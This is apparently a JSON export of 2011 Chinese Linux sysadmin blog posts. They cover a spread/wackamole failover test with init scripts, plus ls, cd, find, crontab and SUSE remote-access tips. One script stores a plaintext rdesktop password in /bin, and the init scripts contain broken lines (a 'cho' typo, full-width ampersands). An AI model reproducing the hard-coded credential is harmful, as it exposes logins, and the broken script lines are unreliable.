00:50:56:91:00:1B\ninet addr:192.168.9.162  Bcast:192.168.255.255  Mask:255.255.0.0\ninet6 addr: fe80::250:56ff:fe91:1b/64 Scope:Link\nUP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1\nRX packets:1054714 errors:0 dropped:0 overruns:0 frame:0\nTX packets:356497 errors:0 dropped:0 overruns:0 carrier:0\ncollisions:0 txqueuelen:1000\nRX bytes:123799512 (118.0 MiB)  TX bytes:94783259 (90.3 MiB)\neth0:1    Link encap:Ethernet  HWaddr 00:50:56:91:00:1B\ninet addr:192.168.9.112  Bcast:192.168.9.112  Mask:255.255.255.255\nUP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</pre>\nroot@test00:~$ ifconfig\n[cc lang='bash'  width=\"99%\" height=\"100%\"]eth0      Link encap:Ethernet  HWaddr 00:50:56:91:00:13\ninet addr:192.168.9.160  Bcast:192.168.255.255  Mask:255.255.0.0\ninet6 addr: fe80::250:56ff:fe91:13/64 Scope:Link\nUP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1\nRX packets:966721 errors:0 dropped:0 overruns:0 frame:0\nTX packets:343226 errors:0 dropped:0 overruns:0 carrier:0\ncollisions:0 txqueuelen:1000\nRX bytes:182954295 (174.4 MiB)  TX bytes:67258649 (64.1 MiB)\neth0:3    Link encap:Ethernet  HWaddr 00:50:56:91:00:13\ninet addr:192.168.9.113  Bcast:192.168.9.113  Mask:255.255.255.255\nUP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1[/cc]\n[cc lang='bash'  width=\"99%\" height=\"100%\"]root@test01:~$ ifconfig\neth0      Link encap:Ethernet  HWaddr 00:50:56:91:00:15\ninet addr:192.168.9.161  Bcast:192.168.255.255  Mask:255.255.0.0\ninet6 addr: fe80::250:56ff:fe91:15/64 Scope:Link\nUP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1\nRX packets:869456 errors:0 dropped:0 overruns:0 frame:0\nTX packets:162884 errors:0 dropped:0 overruns:0 carrier:0\ncollisions:0 txqueuelen:1000\nRX bytes:161753343 (154.2 MiB)  TX bytes:40910624 (39.0 MiB)\neth0:1    Link encap:Ethernet  HWaddr 00:50:56:91:00:15\ninet addr:192.168.9.109  Bcast:192.168.9.109  Mask:255.255.255.255\nUP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</pre>\n<strong>7 实验（）</strong>\n原理：我自己写了脚本，去检测本机的一些进程和服务是否异常。假如异常，就执行脚本命令，停止这个机器上的wackamole进程；当进程和服务恢复，我又执行脚本命令，开启wackamole进程\n这里模拟出现异常，脚本杀掉进程：\n<pre class=\"sh_bash\">root@test02:~$ /etc/init.d/wackamole stop\nStopping wackamole...                                      [确定]\n</pre>\n执行ifconfig:\n<pre class=\"sh_bash\">root@test02:~$ ifconfig\neth0      Link encap:Ethernet  HWaddr 00:50:56:91:00:1B\ninet addr:192.168.9.162  Bcast:192.168.255.255  Mask:255.255.0.0\ninet6 addr: fe80::250:56ff:fe91:1b/64 Scope:Link\nUP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1\nRX packets:1059629 errors:0 dropped:0 overruns:0 frame:0\nTX packets:359237 errors:0 dropped:0 overruns:0 carrier:0\ncollisions:0 txqueuelen:1000\nRX bytes:124517323 (118.7 MiB)  TX bytes:95293463 (90.8 MiB)[/cc]\n执行其他2台服务器,发现：\n<pre class=\"sh_bash\">root@yfs00:~$  ifconfig\neth0      Link encap:Ethernet  HWaddr 00:50:56:91:00:13\ninet addr:192.168.9.160  Bcast:192.168.255.255  Mask:255.255.0.0\ninet6 addr: fe80::250:56ff:fe91:13/64 Scope:Link\nUP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1\nRX packets:972018 errors:0 dropped:0 overruns:0 frame:0\nTX packets:345715 errors:0 dropped:0 overruns:0 carrier:0\ncollisions:0 txqueuelen:1000\nRX bytes:184164965 (175.6 MiB)  TX bytes:67683923 (64.5 MiB)\neth0:1    Link encap:Ethernet  HWaddr 00:50:56:91:00:13\ninet addr:192.168.9.112  Bcast:192.168.9.112  Mask:255.255.255.255\nUP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1\neth0:3    Link encap:Ethernet  HWaddr 00:50:56:91:00:13\ninet addr:192.168.9.113  Bcast:192.168.9.113  Mask:255.255.255.255\nUP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</pre>\n^.^  成功了，飘过来了\n再看一下HA延迟，刚才我一直在另外一个服务器上执行 ping 192.168.9.112\n<pre class=\"sh_bash\">64 bytes from 192.168.9.112: icmp_seq=144 ttl=64 time=0.314 ms\n64 bytes from 192.168.9.112: icmp_seq=145 ttl=64 time=0.333 ms\n64 bytes from 192.168.9.112: icmp_seq=146 ttl=64 time=0.414 ms\n64 bytes from 192.168.9.112: icmp_seq=147 ttl=64 time=0.346 ms\n64 bytes from 192.168.9.112: icmp_seq=148 ttl=64 time=0.373 ms\n64 bytes from 192.168.9.112: icmp_seq=149 ttl=64 time=0.333 ms\n64 bytes from 192.168.9.112: icmp_seq=150 ttl=64 time=0.313 ms\n64 bytes from 192.168.9.112: icmp_seq=151 ttl=64 time=0.323 ms\n64 bytes from 192.168.9.112: icmp_seq=152 ttl=64 time=0.324 ms\n64 bytes from 192.168.9.112: icmp_seq=153 ttl=64 time=0.432 ms\n64 bytes from 192.168.9.112: icmp_seq=154 ttl=64 time=0.510 ms\n64 bytes from 192.168.9.112: icmp_seq=155 ttl=64 time=0.348 ms\n64 bytes from 192.168.9.112: icmp_seq=156 ttl=64 time=0.303 ms\n64 bytes from 192.168.9.112: icmp_seq=157 ttl=64 time=0.383 ms\n64 bytes from 192.168.9.112: icmp_seq=158 ttl=64 time=0.365 ms</pre>\n看，没有停顿！\n注：我们可以使用 spmonitor命令，进去选择0，查看个节点情况\n<strong>8 发布我改善后的启动脚本（尊重原创，我这里只是修改）：</strong>\n1  spread：\n<pre class=\"sh_bash\">#!/bin/bash\n#\n# spread        This starts and stops spread\n#\n# chkconfig: 345 90 10\n# description: This starts the spread daemon\n#\n# processname: spread\n# config: /etc/spread.conf\n# pidfile:/var/run/spread.pid\nDAEMON=/usr/sbin/spread\nCONFIG=/etc/spread.conf\nLOG=/your/path/spread.log\nHOST=`uname -n`\nNAME=\"spread\"\nRETVAL=0\n#Source function library.\n. /etc/rc.d/init.d/functions\nstart() {\necho -n \"Starting $NAME...\"\ndaemon $($DAEMON -c $CONFIG -n $HOST 2&gt;&amp;1 &gt;$LOG ＆;)＆;\nRETVAL=$?\n[ \"$RETVAL\" = 0 ] &amp;&amp; touch /var/lock/subsys/$NAME\necho\n}\nstop() {\necho -n \"Stopping $NAME...\"\nkillproc $DAEMON\n[ \"$RETVAL\" = 0 ] &amp;&amp; rm -f /var/lock/subsys/$NAME\necho\n}\ncase \"$1\" in\nstart)\nstart\n;;\nstop)\nstop\n;;\nrestart)\nstop\nstart\n;;\nstatus)\nstatus $NAME\nRETVAL=$?\n;;\n*)\necho $\"Usage: $0 {start|stop|restart|status}\"\nRETVAL=1\nesac\nexit $RETVAL\n</pre></p>\n\n<p>2 wackamole\n<pre class=\"sh_bash\">#!/bin/bash\n#\n# wackamole       This starts and stops wackamole\n#\n# chkconfig: 345 95 05\n# description: This starts the wackamole daemon\n#\n# requires: spread\n# processname: wackamole\n# config: /etc/wackamole.conf\n# pidfile:/var/run/wackamole.pid\nDAEMON=/usr/sbin/wackamole\nCONFIG=/etc/wackamole.conf\nNAME=\"wackamole\"\nRETVAL=0\n#Source function library.\n. /etc/rc.d/init.d/functions\nstart() {\necho -n \"Starting $NAME...\"\ndaemon $DAEMON -c $CONFIG\nRETVAL=$?\n[ \"$RETVAL\" = 0 ] &amp;&amp; touch /var/lock/subsys/$NAME\necho\n}\nstop() {\necho -n \"Stopping $NAME...\"\nkillproc $DAEMON\n[ \"$RETVAL\" = 0 ] &amp;&amp; rm -f /var/lock/subsys/$NAME\necho\n}\ncase \"$1\" in\nstart)\nstart\n;;\nstop)\nstop\n;;\nrestart)\nstop\nstart\n;;\nstatus)\nstatus $NAME\nRETVAL=$?\n;;\n*)\ncho $\"Usage: $0 {start|stop|restart|status}\"\nRETVAL=1\nesac\nexit $RETVAL</pre></p>\n",
    "date": {
      "year": "2011",
      "month": "January",
      "day": "07"
    }
  },
  {
    "id": 17,
    "title": "关于ls的深入研究",
    "category": "linux基础",
    "tags": [
      "ls"
    ],
    "url": "/archives/%E5%85%B3%E4%BA%8Els%E7%9A%84%E6%B7%B1%E5%85%A5%E7%A0%94%E7%A9%B6/",
    "content": "<p><strong>以下是本文重点内容：</strong></p>\n\n<p><strong>1 显示最后一次执行的命令中修改的文件：使用-t选项</strong></p>\n\n<p><strong>2  每行显示一个条目</strong></p>\n\n<p><strong>3  显示文件大小</strong></p>\n\n<p><strong>4 显示文件上次修改的时间</strong></p>\n\n<p><strong>5  递归显示文件</strong></p>\n\n<p><strong>6  显示文件的uid和gid：使用-n选项</strong></p>\n\n<p><strong>7 在颜色不明显分辨时，使不同的文件显示不同的效果</strong></p>\n\n<p><strong>8 一些.bashrc的别名技巧</strong></p>\n\n<p><!--more--></p>\n\n<p><strong> </strong></p>\n\n<p><strong>1 显示最后一次执行的命令中修改的文件：使用-t选项</strong>\n<table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"400\">\n<tbody>\n<tr>\n<td width=\"400\" valign=\"top\"><pre class=\"sh_bash\">[root@server ~]# cat 1\ni am first file ^.^\n[root@server ~]# cat 2\ni am second file ^.^\n[root@server ~]# cat `ls -t | head -1`\ni am second file ^.^ 看见了吧 它执行了2中的文件</pre></td>\n</tr>\n</tbody>\n</table>\n<strong>2  每行显示一个条目：使用-1选项</strong>\n<table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"400\">\n<tbody>\n<tr>\n<td width=\"400\" valign=\"top\"><pre class=\"sh_bash\">[root@server ~]# ls -1\n1\n2\nanaconda-ks.cfg\nctier-server-3.6.0-1.noarch.rpm</pre></td>\n</tr>\n</tbody>\n</table>\n<strong>3  显示文件大小：根据大小自动显示为KB，MG，GB：使用-lh选项</strong>\n<table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"552\">\n<tbody>\n<tr>\n<td width=\"550\" valign=\"top\"><pre class=\"sh_bash\">[root@server ~]# ls –l\n-rw-r--r--  1 root    root   206047591 09-16 09:02 ctier-server-3.6.0-1.noarch.rpm\ndrwxrwxr-x  7 puppet  puppet      4096 08-28 07:58 facter-1.5.8</td></tr></tbody></table></p>\n\n<p>[root@server ~]# ls –lh</p>\n\n<p>-rw-r--r--  1 root    root   197M 09-16 09:02 ctier-server-3.6.0-1.noarch.rpm\ndrwxrwxr-x  7 puppet  puppet 4.0K 08-28 07:58 facter-1.5.8</pre>\n\n\n\n<strong>4 显示文件上次修改的时间：使用-t选项</strong>\n<table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"480\">\n<tbody>\n<tr>\n<td width=\"478\" valign=\"top\"><pre class=\"sh_bash\">[root@server ~]# ls -lt\ndrwxr-xr-x  8 root    root        4096 01-07 15:09 inove\n-rw-r--r--  1 root    root      609001 01-07 11:07 wackamole-2.1.4.tar.gz\n-rwxr-xr-x  1 root    root         234 01-07 09:50 checkc</pre></td>\n</tr>\n</tbody>\n</table>\n<strong>假如想反过来顺序（请注意上面的是按时间顺序排列）：使用-r选项</strong>\n<table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"481\">\n<tbody>\n<tr>\n<td width=\"479\" valign=\"top\"><pre class=\"sh_bash\">[root@server ~]# ls –ltr\n-rwxr-xr-x  1 root    root         234 01-07 09:50 checkc\n-rw-r--r--  1 root    root      609001 01-07 11:07 wackamole-2.1.4.tar.gz\ndrwxr-xr-x  8 root    root        4096 01-07 15:09 inove</pre></td>\n</tr>\n</tbody>\n</table>\n<strong>5  递归显示文件：使用-R选项</strong>\n<table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"518\">\n<tbody>\n<tr>\n<td width=\"516\" valign=\"top\"><pre class=\"sh_bash\">[root@server ~]# ls -R  /tmp\n/tmp:\n4803                        hsperfdata_root\ncherokee-admin-scgi.socket  org.hibernate.cache.StandardQueryCache.data\nderby.log                   org.hibernate.cache.UpdateTimestampsCache.data\nhsperfdata_ctier</td></tr></tbody></table></p>\n\n<p>/tmp/hsperfdata_ctier:\n2352</p>\n\n<p>/tmp/hsperfdata_root:</pre>\n\n\n\n<strong>6  显示文件的uid和gid：使用-n选项</strong>\n<table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"470\">\n<tbody>\n<tr>\n<td width=\"468\" valign=\"top\"><pre class=\"sh_bash\">[root@server ~]# ls -l rubygems-1.3.5/Rakefile\n-rw-r--r-- 1 foreman games 5111 2009-06-27 rubygems-1.3.5/Rakefile\n[root@server ~]# ls -n rubygems-1.3.5/Rakefile\n-rw-r--r-- 1 501 20 5111 2009-06-27 rubygems-1.3.5/Rakefile</pre></td>\n</tr>\n</tbody>\n</table>\n<strong>7  在颜色不明显分辨时，使不同的文件显示不同的效果：（/:目录；@：链接文件；*：可执行文件；=：socket文件）</strong>\n<table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"526\">\n<tbody>\n<tr>\n<td width=\"524\" valign=\"top\"><pre class=\"sh_bash\">[root@server ~]# ls -F /tmp/\n4803=                        hsperfdata_root/\ncherokee-admin-scgi.socket=  org.hibernate.cache.StandardQueryCache.data\nderby.log                    org.hibernate.cache.UpdateTimestampsCache.data\nhsperfdata_ctier/</pre></td>\n</tr>\n</tbody>\n</table>\n<strong>8 一些.bashrc的别名技巧：</strong>\n<table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"400\">\n<tbody>\n<tr>\n<td width=\"400\" valign=\"top\"><pre class=\"sh_bash\"><strong>以下是我个人定制的2个别名：\n</strong>1 alias ll=\"ls -lh\"\n2 alias ls=\"ls -F --color=auto\"  </pre></td>\n</tr>\n</tbody>\n</table></p>\n",
    "date": {
      "year": "2011",
      "month": "January",
      "day": "07"
    }
  },
  {
    "id": 18,
    "title": "关于cd命令的深入研究",
    "category": "linux基础",
    "tags": [
      "cd"
    ],
    "url": "/archives/%E5%85%B3%E4%BA%8Ecd%E5%91%BD%E4%BB%A4%E7%9A%84%E6%B7%B1%E5%85%A5%E7%A0%94%E7%A9%B6/",
    "content": "<p>在本文主要以下内容：</p>\n\n<p><strong>1  使用CDPATH定义特需的目录</strong></p>\n\n<p><strong>2  使用alias在bash_profile文件创建别名</strong></p>\n\n<p><strong>3 将几个命令联合使用（这里我使用mkdir+cd）</strong></p>\n\n<p><strong>4 自动纠正拼写错误的目录名称<!--more--></strong></p>\n\n<p><strong>1  使用CDPATH定义特需的目录：</strong></p>\n\n<p>当我登录到一台主机后，在它的home目录。我想执行cd命令去到一个目录（例如/var/lib下的某个子目录）：\n<table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"400\">\n<tbody>\n<tr>\n<td width=\"400\" valign=\"top\"><pre class=\"sh_bash\">[root@server ~]# pwd\n/root&nbsp;</td></tr></tbody></table></p>\n\n<p>[root@server ~]# ls -l /var/lib\ndrwxr-xr-x  3 foreman  foreman  4096 12-25 18:19 foreman</p>\n\n<p>[root@server ~]# cd  foreman\n-bash: cd: foreman: 没有那个文件或目录</pre>\n\n\n\n然后：\n<table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"400\">\n<tbody>\n<tr>\n<td width=\"400\" valign=\"top\"><pre class=\"sh_bash\">[root@server ~]# pwd\n/root&nbsp;</td></tr></tbody></table></p>\n\n<p>[root@server ~]# export CDPATH=/var/lib\n[root@server ~]# cd  foreman\n/var/lib/foreman</pre>\n\n\n\n而且不影响当前目录是切换目录：\n<table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"400\">\n<tbody>\n<tr>\n<td width=\"400\" valign=\"top\"><pre class=\"sh_bash\">[root@server ~]# cd src/\n[root@server src]# pwd\n/root/src</pre></td>\n</tr>\n</tbody>\n</table>\n<strong>2  使用alias在bash_profile文件创建别名：</strong>\n<table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"400\">\n<tbody>\n<tr>\n<td width=\"400\" valign=\"top\"><pre class=\"sh_bash\">alias ..=\"cd ..\"\nalias ..2=\"cd ../..\"\nalias ..3=\"cd ../../..\"\nalias ..4=\"cd ../../../..\"\nalias ..5=\"cd ../../../../..\"</pre></td>\n</tr>\n</tbody>\n</table>\n重新登录：\n<table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"400\">\n<tbody>\n<tr>\n<td width=\"400\" valign=\"top\"><pre class=\"sh_bash\">[root@server ~]# mkdir -p /1/2/3/4/5/6/7\n[root@server ~]# cd /1/2/3/4/5/6/7\n[root@server 7]# pwd\n/1/2/3/4/5/6/7\n[root@server 7]# ..4\n[root@server 3]# pwd\n/1/2/3</pre></td>\n</tr>\n</tbody>\n</table>\n<strong>3 例如将几个命令联合使用（这里我使用mkdir+cd）：</strong></p>\n\n<p>工作中可以将命令集合使用：同时执行mkdir一个目录，然后cd进去：</p>\n\n<p>定义自定义功能到bash_profile文件：\nfunction mkdircd () { mkdir -p \"$@\" &amp;&amp; eval cd \"\\\"\\$$#\\\"\"; }\n<table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"400\">\n<tbody>\n<tr>\n<td width=\"400\" valign=\"top\"><pre class=\"sh_bash\">[root@server ~]# mkdircd /1/2/3/4/5/6/7/8\n[root@server 8]# pwd\n/1/2/3/4/5/6/7/8</pre></td>\n</tr>\n</tbody>\n</table>\n<strong>4  一个很变态的功能：自动纠正拼写错误的目录名称</strong></p>\n\n<p>假如我想切换到一个目录，例如1中的目录（文中我会打错，但是依然能切换，但是不支持例一的CDPATH）：\n<table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"502\">\n<tbody>\n<tr>\n<td width=\"500\" valign=\"top\"><pre class=\"sh_bash\">[root@server ~]# cd /var/lib/foremann\n-bash: cd: foremann: 没有那个文件或目录\n[root@server ~]# shopt -s cdspell\n[root@server ~]# cd foremann\n-bash: cd: foremann: 没有那个文件或目录\n[root@server ~]# cd /var/lib/foremann\n/var/lib/foreman</pre></td>\n</tr>\n</tbody>\n</table></p>\n",
    "date": {
      "year": "2011",
      "month": "January",
      "day": "08"
    }
  },
  {
    "id": 19,
    "title": "关于find命令的研究",
    "category": "linux基础",
    "tags": [
      "find"
    ],
    "url": "/archives/%E5%85%B3%E4%BA%8Efind%E5%91%BD%E4%BB%A4%E7%9A%84%E7%A0%94%E7%A9%B6/",
    "content": "<p><strong>1  忽略大小写的查找</strong></p>\n\n<p><strong> </strong><strong>2  查找文件目录的深度限制</strong></p>\n\n<p><strong>3 根据文件属性查找</strong></p>\n\n<p><strong>4 查找空文件</strong></p>\n\n<p><strong>5  工作中可能想要删除一些临时文件，想要删除最大的五个文件，这样查找</strong></p>\n\n<p><strong>6  查找指定文件类型的文件</strong></p>\n\n<p><strong>7  根据文件修改时间查找</strong></p>\n\n<p><strong>8  根据文件大小查找</strong></p>\n\n<p><strong>9  alias小技巧</strong></p>\n\n<p><!--more--></p>\n\n<p><strong></strong></p>\n\n<p><strong>1  忽略大小写的查找：</strong>\n<table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"400\">\n<tbody>\n<tr>\n<td width=\"400\" valign=\"top\"><pre class=\"sh_bash\">[root@server test]# ls\nfan  Fan  FAN</td></tr></tbody></table></p>\n\n<p>[root@server test]# find -name 'fan'\n./fan\n[root@server test]# find -iname 'fan'\n./Fan\n./FAN\n./fan</pre>\n\n\n\n<strong>2  查找文件目录的深度限制（从/开始计算。包括maxdepth和mindepth）：</strong>\n<table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"467\">\n<tbody>\n<tr>\n<td width=\"465\" valign=\"top\"><pre class=\"sh_bash\">[root@server test]# find / -name 'passwd'\n/usr/share/doc/nss_ldap-253/pam.d/passwd\n/usr/bin/passwd\n/etc/pam.d/passwd\n/etc/passwd</td></tr></tbody></table></p>\n\n<p>[root@server test]# cd /</p>\n\n<p>[root@server /]# find -mindepth 3 -maxdepth 3 -name 'passwd'\n./usr/bin/passwd\n./etc/pam.d/passwd</p>\n\n<p>看到了吧，第一个和最后一个文件没有被列出来          </pre>\n\n\n\n<strong>3 根据文件属性查找：</strong>\n<table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"503\">\n<tbody>\n<tr>\n<td width=\"501\" valign=\"top\"><pre class=\"sh_bash\">[root@server test]# ll\n总计 0\n-rw-r--r-- 1 root root 0 01-08 17:01 fan\n-rwxrwxrwx 1 root root 0 01-08 17:00 Fan\n----r----- 1 root root 0 01-08 20:45 FAn\n-rw-r----- 1 root root 0 01-08 17:01 FAN</pre></td>\n</tr>\n</tbody>\n</table>\n1  查找其中组权限是r的，也可以包括其他的权限：\n<table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"445\">\n<tbody>\n<tr>\n<td width=\"443\" valign=\"top\"><pre class=\"sh_bash\">[root@server test]#  find . -perm -g=r -type f -exec ls -l {} \\;\n----r----- 1 root root 0 01-08 20:45 ./FAn\n-rwxrwxrwx 1 root root 0 01-08 17:00 ./Fan\n-rw-r----- 1 root root 0 01-08 17:01 ./FAN\n-rw-r--r-- 1 root root 0 01-08 17:01 ./fan</pre></td>\n</tr>\n</tbody>\n</table>\n2 查找其中组权限是r的，不能包括其他权限：\n<table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"446\">\n<tbody>\n<tr>\n<td width=\"444\" valign=\"top\"><pre class=\"sh_bash\">[root@server test]#  find . -perm g=r -type f -exec ls -l {} \\;\n----r----- 1 root root 0 01-08 20:45 ./FAn</pre></td>\n</tr>\n</tbody>\n</table>\n<strong>4 查找空文件（0字节文件）</strong>\n<table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"448\">\n<tbody>\n<tr>\n<td width=\"446\" valign=\"top\"><pre class=\"sh_bash\">[root@server /]#  find ~ -empty\n/root/.gconf/apps/%gconf.xml\n/root/.gconf/apps/gnome-session/%gconf.xml\n/root/test/FAn\n/root/test/Fan\n/root/test/faN\n/root/test/FAN\n/root/test/fan\n/root/spread-bin-4.0.0</pre></td>\n</tr>\n</tbody>\n</table>\n注按照深度去查找，日不我只想查找2层深度的文件：\n<table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"400\">\n<tbody>\n<tr>\n<td width=\"400\" valign=\"top\"><pre class=\"sh_bash\">[root@server /]# find . -maxdepth 2 –empty\n./root/spread-bin-4.0.0</pre></td>\n</tr>\n</tbody>\n</table>\n<strong>5  工作中可能想要删除一些临时文件，想要删除最大的五个文件，这样查找：</strong>\n<table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"493\">\n<tbody>\n<tr>\n<td width=\"491\" valign=\"top\"><pre class=\"sh_bash\">[root@server ~]#  find . -type f -exec ls -s {} \\; | sort -n -r | head -5\n201424 ./ctier-server-3.6.0-1.noarch.rpm\n14568 ./.cpan/Metadata\n4700 ./ruby-1.8.7.tar.gz\n4316 ./ruby-1.8.7/libruby-static.a\n3372 ./passenger-2.2.11/ext/apache2/ApplicationPoolServerExecutable</pre></td>\n</tr>\n</tbody>\n</table>\n<strong>6  查找指定文件类型的文件:使用-type选项</strong></p>\n\n<p>d：目录；s：socket文件；f：普通文件 ……\n<table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"400\">\n<tbody>\n<tr>\n<td width=\"400\" valign=\"top\"><pre class=\"sh_bash\">查找隐藏的目录：\n[root@server ~]# find -type d -name \".*\"\n.\n./.gconf\n./.elinks\n./.gem\n./.gconfd\n./.ssh\n./ruby-1.8.7/.ext\n./.cpan</pre></td>\n</tr>\n</tbody>\n</table>\n<strong>7  根据文件修改时间查找：</strong>\n<table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"450\">\n<tbody>\n<tr>\n<td width=\"448\" valign=\"top\"><pre class=\"sh_bash\">[root@server test]# ls -lrt\n总计 0\n-rwxrwxrwx 1 root root 0 01-08 17:00 Fan\n-rw-r--r-- 1 root root 0 01-08 17:01 fan\n-rw-r----- 1 root root 0 01-08 17:01 FAN\n----r----- 1 root root 0 01-08 20:45 FAn\n-rw-r--r-- 1 root root 0 01-08 20:49 faN指定查找某文件修改时间之前修改或者创建的文件：</td></tr></tbody></table></p>\n\n<p>[root@server test]# find -newer FAN\n.\n./FAn\n./faN</pre>\n\n\n\n<strong>8  根据文件大小查找：</strong>\n<table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"400\">\n<tbody>\n<tr>\n<td width=\"400\" valign=\"top\"><pre class=\"sh_bash\">查找大于20M的文件\n[root@server ~]# find . -size +20M\n./ctier-server-3.6.0-1.noarch.rpm\n查找小于1M的文件：\n[root@server ~]# find . -size -1M\n./.gconf/apps/%gconf.xml\n./.gconf/apps/gnome-session/%gconf.xml\n./test/FAn\n./test/Fan\n./test/faN\n./test/FAN\n./test/fan</pre></td>\n</tr>\n</tbody>\n</table>\n<strong>9  alias小技巧：</strong></p>\n\n<p><strong>工作中可能会经常删除一些core文件，可以这样定义到profie文件</strong>\n<table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"400\">\n<tbody>\n<tr>\n<td width=\"400\" valign=\"top\"><pre class=\"sh_bash\">alias rmcore=\"find . -iname core -exec rm {} \\;\"</pre></td>\n</tr>\n</tbody>\n</table>\n也可能要删除一些log文件，可以这样定义：\n<table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"502\">\n<tbody>\n<tr>\n<td width=\"500\" valign=\"top\"><pre class=\"sh_bash\">alias rmlog=\"find /logs -type f -name *.tar -size +500M -exec rm -i {} \\;\"\nalias rm1g=\"find / -type f -name *.tar -size +1G -exec rm -i {} \\;\"</pre></td>\n</tr>\n</tbody>\n</table></p>\n",
    "date": {
      "year": "2011",
      "month": "January",
      "day": "08"
    }
  },
  {
    "id": 20,
    "title": "suse的远程连接技巧",
    "category": "opensuse",
    "tags": [
      "ssh乱码",
      "suse",
      "windows远程桌面"
    ],
    "url": "/archives/susedeyuanchenglianjiejiqiao/",
    "content": "<p><strong>1 suse的windows远程桌面：</strong></p>\n\n<p>rdesktop是一个很好的windows远程桌面的工具，suse默认已经安装。但是一定要确保Windows开启Windows Terminal Service。</p>\n\n<p>我习惯使用命令行，将登录命令写在脚本里面并作为外部命令，看我的操作：</p>\n\n<p><pre class=\"sh_bash\">#vi /bin/25</p>\n\n<p>#!/bin/bash\nrdesktop -u admin -p admiN@\\(23324 -f -r clipboard:PRIMARYCLIPBOARD -r disk:sunray=/home/dongwm 192.168.9.100:9922</pre></p>\n\n<p>其中 －u加用户名</p>\n\n<p>－p加密码，但是注意特殊符号需要进行加转义符“\\”</p>\n\n<p>-r clipboard:PRIMARYCLIPBOARD  可以在linux和windows直接进行复制粘贴</p>\n\n<p>-r disk:sunray=/home/dongwm   效果类似于samba，直接实现ftp等功能</p>\n\n<p>设置其执行权限：</p>\n\n<p>＃chmod +x /bin/25</p>\n\n<p>这样这个脚本就成了外部命令，只要在终端输入：</p>\n\n<p>＃25</p>\n\n<p>即可</p>\n\n<p><strong>2  suse的远程ssh乱码</strong></p>\n\n<p>我们远程登录一些系统，可能他使用的一些编码会让我们在终端显示乱码，但是因为某些原因却不能对远程主机修改其编码类型，所以我们使用luit,命令如下：</p>\n\n<p><pre class=\"sh_bash\">luit -encoding gbk ssh root@192.168.9.100 -p 9922</pre></p>\n\n<p>luit主要进行终端的编码转换，这样的话我们就不会看见乱码，也不用修改远程主机的编码类型了</p>\n",
    "date": {
      "year": "2011",
      "month": "January",
      "day": "12"
    }
  },
  {
    "id": 21,
    "title": "关于crontab深入研究",
    "category": "linux基础",
    "tags": [
      "crontab，计划任务"
    ],
    "url": "/archives/%E5%85%B3%E4%BA%8Ecrontab%E6%B7%B1%E5%85%A5%E7%A0%94%E7%A9%B6/",
    "content": "<p><p><strong>以下是本文的重点内容：</strong></p>  <p><strong>1</strong><strong>.在一天做N次的计划任务</strong></p>  <p><strong>2.在一天的特定时间段的计划任务</strong></p>  <p><strong>3.查看root以外用户的计划任务内容</strong></p>  <p><strong>4.在相隔时间后执行计划任务</strong></p>  <p><strong>5.某特定相隔时间的计划任务</strong></p>  <p><strong>6.重启后执行计划任务</strong></p>  <p><strong>7.以秒为单位执行计划任务</strong></p> <!--more-->  <p><strong></strong></p>  <p><strong>1.在一天做N次的计划任务：</strong></p>  <p>以下例子代表在12点和18点执行脚本：</p>  <table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"400\"><tbody>     <tr>       <td valign=\"top\" width=\"400\">         <p>00 12,18 * * * /home/dongwm/test.sh</p>       </td>     </tr>   </tbody></table>  <p><strong>2.在一天的特定时间段的计划任务：</strong></p>  <p>以下代表在12点到18点的每个小时的整点执行脚本：</p>  <table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"400\"><tbody>     <tr>       <td valign=\"top\" width=\"400\">00 12-18 * * * /home/dongwm/test.sh</td>     </tr>   </tbody></table>  <p>以下代表在工作日（不包括周六日）的12点到18点的整点执行脚本：</p>  <table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"400\"><tbody>     <tr>       <td valign=\"top\" width=\"400\">00 12-18 * * 1-5 /home/dongwm/test.sh</td>     </tr>   </tbody></table>  <p><strong>3.查看root以外用户的计划任务内容：</strong></p>  <p>编辑使用-e选项：</p>  <table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"400\"><tbody>     <tr>       <td valign=\"top\" width=\"400\">         <p>[root@server ~]# crontab -u test -l            00 12,18 * * * /home/dongwm/test.sh</p>       </td>     </tr>   